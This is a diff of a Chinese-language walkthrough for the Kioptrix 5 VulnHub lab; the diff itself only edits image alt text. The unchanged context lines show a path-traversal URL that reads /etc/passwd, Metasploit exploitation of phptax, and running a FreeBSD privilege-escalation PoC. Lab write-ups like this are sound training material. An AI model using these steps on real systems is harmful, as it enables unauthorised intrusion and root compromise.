@@ -55,7 +55,7 @@ Works out of the box with VMware workstation 10, player 6, fusion 6 (Can edit th
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.147` 就是目标了
 
@@ -64,13 +64,13 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.147
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/2.png)
 
 一个 SSH，2个 web,从 web 先入手
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/3.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/4.png)
 
 看来都需要爆破目录了
 ```
@@ -78,17 +78,17 @@ dirb http://192.168.141.147
 dirb http://192.168.141.147:8080
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/5.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/6.png)
 
 啥都没有,再看看 index.html
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/7.png)
 
 有个 pChart2.1.3,访问看看
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/8.png)
 
 ---
 
@@ -99,13 +99,13 @@ dirb http://192.168.141.147:8080
 searchsploit -w pChart
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/9.png)
 
 访问 https://www.exploit-db.com/exploits/31173,发现有个目录遍历可以利用下
 
 `http://192.168.141.147/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd`
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/10.png)
 
 尝试使用这个漏洞挖掘更多的信息
 
@@ -113,25 +113,25 @@ searchsploit -w pChart
 
 想不出来这个 apache22 是怎么爆出来的，难不成是看 apache 版本号?
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/11.png)
 
 看了下 httpd.conf 的内容,发现 8080 只允许 user-agent 为 Mozilla/4.0 Mozilla4_browser 才能访问
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/12.png)
 
 firefox 可以自定义 user-agent
 
 访问 about:config,搜索 general.useragent.override
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/13.png)
 
 输入 `Mozilla/4.0 Mozilla4_browser`,再访问 192.168.141.147:8080
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/14.png)
 
 ok,有东西了,点进去看看
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/15.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/15.png)
 
 看起来这东西有一定年头了,搜了下这是个叫 phptax 的纳税工具,MSF 有个可利用的模块
 ```
@@ -143,7 +143,7 @@ set RPORT 8080
 run
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/16.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/16.png)
 
 下面尝试提权
 
@@ -157,13 +157,13 @@ run
 uname -a
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/17.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/17.png)
 
 ```
 searchsploit -w freebsd 9.0
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/18.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/18.png)
 
 kali 访问 https://www.exploit-db.com/download/26368,下载 poc
 
@@ -183,6 +183,6 @@ ls
 ./a.out
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/19.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix5/19.png)
 
 提权成功,感谢 Kioptrix Team 制作的系列靶机
